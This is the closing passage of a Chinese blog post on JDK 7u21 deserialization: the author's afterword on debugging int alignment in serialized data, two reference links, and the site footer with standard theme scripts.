<p>后言：其实我记录的比较简单，关于<code>导致的问题</code>这里得经过调试以及查看序列化源码才能得出，我最开始是看参考文章以为就那么回事，然后我是打算补全那个int数据的，也就是填充数据，然后发生了报错，以及感觉到一些疑点吧。反正就始终说服不了自己，主要就是参考文章里面删除那两个数据，为什么呢，为什么呢？？我知道是对齐int，但是会不会对其他数据照成影响呢？然后就自己琢磨哇，也是搞得明明白白了很爽。然后调试找序列化数据里面对应的位置，可以通过前后pos的值去找</p>
</blockquote>
<p><strong>参考</strong></p>
<blockquote>
<p><a href="https://tttang.com/archive/1729/#toc">https://tttang.com/archive/1729/#toc</a>_</p>
<p><a href="https://exp10it.io/2022/12/jdk-7u21-deserialization/#%E6%96%B0%E7%9A%84%E6%9E%84%E9%80%A0%E6%96%B9%E5%BC%8F">https://exp10it.io/2022/12/jdk-7u21-deserialization/#%E6%96%B0%E7%9A%84%E6%9E%84%E9%80%A0%E6%96%B9%E5%BC%8F</a></p>
</blockquote>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson1.2.24-1.2.80/">
    <span class="title">« 上一页</span>
    <br>
    <span>Fastjson1.2.24-1.2.80 反序列化</span>
  </a>
  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/chain/fury%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96aliyunctf-jtool/">
    <span class="title">下一页 »</span>
    <br>
    <span>Fury反序列化&amp;aliyunctf-jtool</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
